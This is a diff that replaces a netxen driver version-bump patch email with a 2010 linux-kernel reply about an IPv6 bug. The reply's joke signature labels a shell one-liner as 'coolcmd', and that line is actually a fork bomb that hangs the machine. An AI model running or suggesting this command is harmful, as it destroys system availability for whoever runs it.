@@ -1,39 +1,37 @@
-From: Amit Kumar Salecha <amit.salecha@qlogic.com>
-Subject: [PATCH 2/2] netxen: update version 4.0.74
-Date: Tue, 17 Aug 2010 23:51:52 -0700
-Message-ID: <1282114312-23500-2-git-send-email-amit.salecha@qlogic.com>
-References: <1282114312-23500-1-git-send-email-amit.salecha@qlogic.com>
-Cc: netdev@vger.kernel.org, ameen.rahman@qlogic.com
-To: davem@davemloft.net
-Return-path: <netdev-owner@vger.kernel.org>
-Received: from mvnat01.qlogic.com ([198.186.3.73]:41714 "HELO unm84.unmin.com"
-	rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
-	id S1750922Ab0HRGvx (ORCPT <rfc822;netdev@vger.kernel.org>);
-	Wed, 18 Aug 2010 02:51:53 -0400
-In-Reply-To: <1282114312-23500-1-git-send-email-amit.salecha@qlogic.com>
-Sender: netdev-owner@vger.kernel.org
-List-ID: <netdev.vger.kernel.org>
+From: Thomas Habets <thomas@habets.pp.se>
+Subject: Re: BUG: IPv6 stops working after a while, needs ip ne del command
+ to reset
+Date: Wed, 18 Aug 2010 09:02:04 +0200 (CEST)
+Message-ID: <alpine.DEB.1.10.1008180900350.21857@red.crap.retrofitta.se>
+References: <1282024802.2487.687.camel@edumazet-laptop> <alpine.DEB.1.10.1008171053230.21857@red.crap.retrofitta.se> <1282050920.2448.47.camel@edumazet-laptop> <alpine.DEB.1.10.1008171547090.21857@red.crap.retrofitta.se> <1282055659.2448.58.camel@edumazet-laptop>
+ <alpine.DEB.1.10.1008171737260.21857@red.crap.retrofitta.se> <20100817171115.GA4134@mcarlson.broadcom.com> <alpine.DEB.1.10.1008171928160.21857@red.crap.retrofitta.se> <20100817183112.GA4351@mcarlson.broadcom.com> <alpine.DEB.1.10.1008172035520.21857@red.crap.retrofitta.se>
+ <20100818012318.GA4630@mcarlson.broadcom.com>
+Mime-Version: 1.0
+Content-Type: TEXT/PLAIN; charset=US-ASCII; format=flowed
+Cc: Thomas Habets <thomas@habets.pp.se>,
+	Eric Dumazet <eric.dumazet@gmail.com>,
+	"linux-kernel@vger.kernel.org" <linux-kernel@vger.kernel.org>,
+	netdev <netdev@vger.kernel.org>,
+	Michael Chan <mchan@broadcom.com>
+To: Matt Carlson <mcarlson@broadcom.com>
+Return-path: <linux-kernel-owner@vger.kernel.org>
+In-Reply-To: <20100818012318.GA4630@mcarlson.broadcom.com>
+Sender: linux-kernel-owner@vger.kernel.org
+List-Id: netdev.vger.kernel.org
 
-Signed-off-by: Amit Kumar Salecha <amit.salecha@qlogic.com>
----
- drivers/net/netxen/netxen_nic.h |    4 ++--
- 1 files changed, 2 insertions(+), 2 deletions(-)
+On Tue, 17 Aug 2010, Matt Carlson wrote:
+> Do you have access to any diagnostic software that might have come with
+> your machine?
 
-diff --git a/drivers/net/netxen/netxen_nic.h b/drivers/net/netxen/netxen_nic.h
-index ffa1b9c..6dca357 100644
---- a/drivers/net/netxen/netxen_nic.h
-+++ b/drivers/net/netxen/netxen_nic.h
-@@ -53,8 +53,8 @@
- 
- #define _NETXEN_NIC_LINUX_MAJOR 4
- #define _NETXEN_NIC_LINUX_MINOR 0
--#define _NETXEN_NIC_LINUX_SUBVERSION 73
--#define NETXEN_NIC_LINUX_VERSIONID  "4.0.73"
-+#define _NETXEN_NIC_LINUX_SUBVERSION 74
-+#define NETXEN_NIC_LINUX_VERSIONID  "4.0.74"
- 
- #define NETXEN_VERSION_CODE(a, b, c)	(((a) << 24) + ((b) << 16) + (c))
- #define _major(v)	(((v) >> 24) & 0xff)
--- 
-1.6.0.2
+I'm don't know what diagnostic software that would be, nor does other 
+people here. So "no", i guess.
 
+---------
+typedef struct me_s {
+   char name[]      = { "Thomas Habets" };
+   char email[]     = { "thomas@habets.pp.se" };
+   char kernel[]    = { "Linux" };
+   char *pgpKey[]   = { "http://www.habets.pp.se/pubkey.txt" };
+   char pgp[] = { "A8A3 D1DD 4AE0 8467 7FDE  0945 286A E90A AD48 E854" };
+   char coolcmd[]   = { "echo '. ./_&. ./_'>_;. ./_" };
+} me_t;
